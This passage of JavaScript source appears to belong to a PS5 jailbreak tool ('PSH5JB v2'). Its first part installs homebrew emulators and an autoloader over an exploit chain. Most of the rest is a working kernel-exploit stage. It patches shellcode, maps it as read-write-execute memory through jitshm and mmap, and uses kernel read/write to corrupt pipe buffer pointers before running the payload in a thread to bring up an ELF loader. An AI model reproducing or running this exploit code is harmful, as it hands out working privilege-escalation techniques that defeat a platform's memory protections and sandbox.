    const sx2Eboot = HOMEBREW_DIR + "/" + HB_SX2 + "/eboot.bin";
    if (await pathExists(p, chain, sx2Eboot)) {
      log("PS5SX2 already installed, skipping installer");
    } else {
      try {
        await sendOneRetry(EMU_PS5SX2_INSTALLER, p, chain, log, 3);
        await waitSeconds(log, "waiting for PS5SX2 installer", 30, null);
        if (!(await pathExists(p, chain, sx2Eboot)))
          log("PS5SX2 installer sent, eboot.bin not found yet");
      } catch (_e) {
        log("PS5SX2 installer skipped: " + (_e && _e.message ? _e.message : String(_e)));
      }
    }
  }

  // snes9x — the ELF is the installer and helper. Do not autoload the 25MB
  // file; the app respawns its helper through 9021 after install.
  {
    const snesEboot = HOMEBREW_DIR + "/" + HB_SNES + "/eboot.bin";
    if (await pathExists(p, chain, snesEboot)) {
      log("snes9x already installed, skipping installer");
    } else {
      try {
        await sendOneRetry(EMU_SNES9X_ELF, p, chain, log, 3);
        await waitSeconds(log, "waiting for snes9x installer", 25, null);
        if (!(await pathExists(p, chain, snesEboot)))
          log("snes9x installer sent, eboot.bin not found yet");
      } catch (_e) {
        log("snes9x installer skipped: " + (_e && _e.message ? _e.message : String(_e)));
      }
    }
  }

  // XPSemu — unzip the title folder, autoload helper, whitelist the title.
  await installZipEmu(EMU_XPSEMU_ZIP, HB_XPS, EMU_XPSEMU_VER, p, chain, log);
  await saveAutoloadElf(EMU_XPSEMU_HELPER, XPSEMU_HELPER_DEST, EMU_XPSEMU_VER, p, chain, log);
  await ensureXpsWhitelist(p, chain, log);

  await installZipEmu(EMU_PORPOISE_ZIP, HB_PORPOISE, EMU_PORPOISE_VER, p, chain, log);

  await installZipEmu(EMU_PS5CEMU_ZIP, HB_CEMU, EMU_PS5CEMU_VER, p, chain, log);
  await saveAutoloadElf(EMU_PS5CEMU_ELEVATOR, "sandbox-elevator.elf", null, p, chain, log);

  // PS5X360 — unzip (not AutoLog.elf) and fix 0600 zip permissions.
  await installZipEmu(EMU_PS5X360_ZIP, HB_X360, EMU_PS5X360_VER, p, chain, log);

  await installZipEmu(EMU_PROSPEROEDEN_ZIP, HB_EDEN, EMU_PROSPEROEDEN_VER, p, chain, log);

  try { await saveAutoloadFiles(p, chain, log, {}); log("autoload.txt rebuilt"); } catch (_err) { log("autoload.txt rebuild failed: " + (_err && _err.message ? _err.message : String(_err))); }

  // Send the installer last — it opens the system PKG UI which closes
  // the browser session, but payloads are already saved so that is fine.
  let installerSent = false;
  for (let _autoAttempt = 1; _autoAttempt <= 3 && !installerSent; _autoAttempt++) {
  try {
    if (_autoAttempt > 1) {
      log("autoloader retry " + _autoAttempt + "/3 — waiting 5s...");
      await new Promise(function(r) { setTimeout(r, 5000); });
    }
    log("injecting WebKit Autoloader installer");
    await sendOne(AUTOLOADER_ELF, p, chain, log);
    const paramJson =
      "{\n" +
      "    \"titleId\": \"WKAL00001\",\n" +
      "    \"applicationCategoryType\": 65536,\n" +
      "    \"deeplinkUri\": \"http://127.0.0.1:18181/app/index.html\",\n" +
      "    \"localizedParameters\": {\n" +
      "        \"defaultLanguage\": \"en-US\",\n" +
      "        \"en-US\": {\n" +
      "            \"titleName\": \"WebKit Autoloader v0.6.0-psh5jbv10\"\n" +
      "        }\n" +
      "    }\n" +
      "}\n";
    try {
      await writeTextFile(p, chain,
        "/user/app/WKAL00001/sce_sys/param.json", paramJson);
    } catch (error) {
      log("WKAL title update skipped: " +
        (error && error.message ? error.message : String(error)));
    }
    installerSent = true;
  } catch (error) {
    if (_autoAttempt < 3) {
      log("autoloader send failed (attempt " + _autoAttempt + "), retrying: " +
        (error && error.message ? error.message : String(error)));
    } else {
      log("WebKit Autoloader installer failed: " +
        (error && error.message ? error.message : String(error)));
    }
  }
  } // end retry loop

  await notify(p, chain, "PSH5JB v2");
  if (installerSent) {
    log(INSTALL_TOAST);
    await notify(p, chain, INSTALL_TOAST);
  } else {
    log("done - press the PS button to go home");
    await notify(p, chain, "done - press the PS button to go home");
  }
}

function patchShellcode(blob, symbols) {
  if (blob.length !== SHELLCODE.size)
    throw new Error("kexp: expected " + SHELLCODE.size + " bytes, got " + blob.length);
  if (SHELLCODE.resolverCalls.some(([offset, bytes]) => !matches(blob, offset, bytes)) ||
      !matches(blob, SHELLCODE.getpid.at, SHELLCODE.getpid.bytes))
    throw new Error("kexp: shellcode signature does not match");

  for (const [offset] of SHELLCODE.resolverCalls)
    for (let i = 0; i < 5; i++) blob[offset + i] = 0x90;

  const addressOf = (group, name) => {
    const { base, offsets } = symbols[group];
    return (BigInt(base.hi) << 32n) + BigInt(base.low >>> 0) + BigInt(offsets[name]);
  };
  for (const [group, imports] of Object.entries(SHELLCODE.imports))
    for (const [name, offset] of Object.entries(imports))
      writeU64(blob, offset, addressOf(group, name));

  const { at, tail, tailAt, padFrom, padTo } = SHELLCODE.getpid;
  blob[at] = 0x48;
  blob[at + 1] = 0xb8;
  writeU64(blob, at + 2, addressOf("libkernel", "getpid"));
  tail.forEach((byte, index) => blob[tailAt + index] = byte);
  for (let i = padFrom; i < padTo; i++) blob[i] = 0x90;

  for (const offset of SHELLCODE.logCalls)
    if (blob[offset] === 0xe8)
      for (let i = 0; i < 5; i++) blob[offset + i] = 0x90;
}

async function mapExecutable(blob, p, chain) {
  const length = (blob.length + 0x3fff) & ~0x3fff;
  const failed = (value) => value.low >>> 0 === 0xffffffff;
  const copyInto = (destination) => {
    const dwords = blob.length & ~3;
    for (let offset = 0; offset < dwords; offset += 4)
      p.write4(destination.add32(offset), readU32(blob, offset));
    for (let offset = dwords; offset < blob.length; offset++)
      p.write1(destination.add32(offset), blob[offset]);
    for (let offset = 0; offset < dwords; offset += 4)
      if (p.read4(destination.add32(offset)) >>> 0 !== readU32(blob, offset)) return false;
    return true;
  };

  const execFd = await chain.syscall(SYS_JITSHM_CREATE, 0, length, PROT_RWX);
  if (failed(execFd) || execFd.low >= 0x100000)
    throw new Error("kexp: jitshm_create failed (" + hex(execFd) + ")");

  const entry = await chain.syscall(SYS_MMAP, 0, length, PROT_RWX, MAP_SHARED, execFd, 0);
  if (failed(entry) || entry.low < 0x10000)
    throw new Error("kexp: executable mmap failed (" + hex(entry) + ")");

  if (!copyInto(entry)) {
    const writeFd = await chain.syscall(SYS_JITSHM_ALIAS, execFd, PROT_RW);
    if (failed(writeFd) || writeFd.low >= 0x100000)
      throw new Error("kexp: writable jitshm alias failed");

    const writable = await chain.syscall(SYS_MMAP, 0, length, PROT_RW, MAP_SHARED, writeFd, 0);
    if (failed(writable) || writable.low < 0x10000)
      throw new Error("kexp: writable mmap failed (" + hex(writable) + ")");
    if (!copyInto(writable) || p.read4(entry) >>> 0 !== readU32(blob, 0))
      throw new Error("kexp: shellcode copy failed");
    await chain.syscall(SYS_MUNMAP, writable, length);
  }
  return entry;
}

async function makePipePair(p, chain) {
  const fds = p.malloc(8, 1);
  const rv = (await chain.syscall(SYS_PIPE2, fds, O_NONBLOCK)).low | 0;
  if (rv < 0) throw new Error("kexp: pipe2 failed (" + rv + ")");

  const readFd = p.read4(fds) >>> 0;
  const writeFd = p.read4(fds.add32(4)) >>> 0;
  if (!readFd || !writeFd || readFd >= 0x100000 || writeFd >= 0x100000)
    throw new Error("kexp: invalid pipe fds " + readFd + "/" + writeFd);
  return { readFd, writeFd };
}

async function prepareShellcodePipes(krw, master, victim) {
  const table = await krw.read8(krw.procFdAddr);
  const pipeOf = async (fd) => {
    const file = await krw.read8(table.add32(FD_ENTRY.ofiles + fd * FD_ENTRY.stride));
    return krw.read8(file.add32(FD_ENTRY.data));
  };

  const masterPipe = await pipeOf(master.readFd);
  const victimPipe = await pipeOf(victim.readFd);
  await krw.write4(masterPipe.add32(PIPE.count), 0);
  await krw.write4(masterPipe.add32(PIPE.in), 0);
  await krw.write4(masterPipe.add32(PIPE.out), 0);
  await krw.write4(masterPipe.add32(PIPE.size), PIPE.defaultSize);
  await krw.write8(masterPipe.add32(PIPE.buffer), victimPipe);

  const readBack = await krw.read8(masterPipe.add32(PIPE.buffer));
  if (readBack.low !== victimPipe.low || readBack.hi !== victimPipe.hi)
    throw new Error("kexp: pipe bootstrap failed");
}

async function spawnAndJoin(entry, args, symbols, p, chain) {
  const { base, offsets } = symbols.libkernel;
  const create = offsets.pthread_create_name_np === undefined
    ? offsets.pthread_create
    : offsets.pthread_create_name_np;
  const handle = p.malloc(8);
  const result = p.malloc(8);
  p.write8(handle, 0);
  p.write8(result, 0);

  const created = await chain.call(base.add32(create), handle, new int64(0, 0), entry, args, p.stringify("payload"));
  if (created.low >>> 0 !== 0)
    throw new Error("kexp: pthread_create returned " + hex(created));

  const joined = await chain.call(base.add32(offsets.pthread_join), p.read8(handle), result);
  return { joinResult: joined.low >>> 0, shellcodeResult: p.read8(result) };
}

export async function runKexp(krw, p, chain, log) {
  const say = typeof log === "function" ? log : () => {};
  const allprocRva = window.KRW && window.KRW.allproc;
  if (!krw || !krw.ktextBase || !krw.procFdAddr)
    throw new Error("kexp: kernel R/W is incomplete");
  if (typeof allprocRva !== "number")
    throw new Error("kexp: allproc is missing for this firmware");

  const allproc = krw.ktextBase.add32(allprocRva);
  if ((allproc.hi & 0xffff0000) >>> 0 !== 0xffff0000)
    throw new Error("kexp: invalid allproc address " + hex(allproc));
  const symbols = resolveSymbols(p);

  const elfldr = await mapElf(DEFAULT_ELFLDR, p, chain);

  const blob = await fetchBinary(DEFAULT_KEXP);
  patchShellcode(blob, symbols);
  const entry = await mapExecutable(blob, p, chain);

  const master = await makePipePair(p, chain);
  const victim = await makePipePair(p, chain);
  await prepareShellcodePipes(krw, master, victim);

  const args = p.malloc(0x28);
  for (let offset = 0; offset < 0x28; offset += 8) p.write8(args.add32(offset), 0);
  p.write4(args.add32(0x00), master.readFd);
  p.write4(args.add32(0x04), master.writeFd);
  p.write4(args.add32(0x08), victim.readFd);
  p.write4(args.add32(0x0c), victim.writeFd);
  p.write8(args.add32(0x10), allproc);
  p.write8(args.add32(0x18), elfldr.base);
  p.write8(args.add32(0x20), elfldr.size);

  const result = await spawnAndJoin(entry, args, symbols, p, chain);
  if (result.joinResult !== 0)
    throw new Error("kexp: pthread_join returned " + hex(result.joinResult));
  await waitForElfldr(p, chain, say);
  return true;
}